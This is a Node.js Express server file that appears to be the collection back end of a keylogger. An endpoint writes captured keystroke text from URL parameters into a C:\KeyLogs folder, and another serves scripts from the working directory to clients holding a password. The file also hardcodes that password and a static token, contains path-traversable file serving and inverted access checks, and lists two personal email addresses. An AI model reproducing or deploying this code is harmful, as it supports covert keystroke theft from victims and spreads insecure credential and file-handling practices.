'use strict'

const handler = require('./handler');
const express = require('express');
const fs = require('fs');
const crypto = require('crypto');
const app = express();
const os = require('os');
const tokengen = handler.generateToken;

let port = 8000;
let logDir = `C:\\KeyLogs`;

fs.mkdir(logDir,(err) => {
    if(err) 
    {
        console.error(err);
    }
});

let password = "this_is_cryptox";
let process = require('process');


let global_token = "test_token";
let isverified = false;

let mails = new Array("abdulhameedotade@gmail.com", "abdul.hameed@acity.edu.gh");
let hashedMails = new Array(mails.length);
let count = 0;
mails.forEach(mail => {
    let algorithm = crypto.createHash('sha512');
    let buffer = Buffer.from(mail);
    mail = algorithm.update(buffer).digest('hex');
    hashedMails[count++] = mail;
},count);

console.log(hashedMails);


var bcolors = {
    OK: "\\33[92m",
    WARNING: "\\33[93m",
    FAIL: "\\33[91m",
    RESET: "\\33[0m"
}

function formatColor(string = "", type = "OK") {
    let start = "";
    if (type === "OK") start = bcolors.OK;
    if (type === "WARNING") start = bcolors.WARNING;
    if (type === "FAIL") start = bcolors.FAIL;

    return start + string + bcolors.RESET;
}

app.get('/', (req, res, next) => {
    res.send("OK");
    next();
});

app.get('/verify/email/:email/token/:token', (req, res, next) => {
    let email = req.params.email;
    let token = req.params.token;
    let isallowed =  false;
    hashedMails.forEach((element) => {
        if(element === email)
        {
            isallowed=true;
        }
    },email);
    isverified = (token === global_token && isallowed) ? true : false;
    let truth = {
        verified : isverified
    }
    if (isverified) {
        res.send(truth);
    } else {
        res.send(truth);
    }
    next();
});

app.get('/get-password/token/:token', (req, res, next) => {
    let token = req.params.token;
    if (!isverified && token === global_token) {
        res.send(password);
    } else {
        res.send("Permission denied");
    }
    next();
});

app.get('/get-script/passcode/:passcode/script/:script_name', (req, res,next) => {

    let filename = req.params.script_name;
    let passcode = req.params.passcode;
    if (isverified && filename != undefined && passcode === password) {
        let path = `${process.cwd()}/${filename}`;
        let exists = fs.existsSync(path);
        (exists) ? res.sendFile(path, (err) => {
            if (err) {
                res.send(err.message);
            }
        }) : undefined;
    } else {
        res.send("Permission denied");
    }
    isverified = false;
    next();
});

app.get('/log-keys/email/:email/passcode/:passcode/logs/:logtext', (req,res) => {

    let email    = req.params.email;
    let passcode = req.params.passcode;
    let logtext = req.params.logtext;
    //logtext = Buffer.from(logtext);
    let isallowed = false;
    let path = '';
    let filename = "KeyLog"
    let date = new Date();
    
    for(let i = 0; i < hashedMails.length; i++)
    {
        if(hashedMails[i] === email) isallowed = true;
    }
    
    if(!isallowed && passcode === password)  
    {
        date = new Date();
        path = [logDir,`${filename}-${date.getSeconds()}-${date.getMilliseconds()}`].join('\\');
        fs.writeFile(path,logtext,(err) => {
            if(err) console.error(err);
        });
        console.log(`[*] File ${path} was successfully created`);
        res.send("OK");
    } else {
        res.send("Permission denied");
    }
});

app.listen(port, () => {
    console.log(handler.formatColor(`server running at http://localhost:${port}`));
})
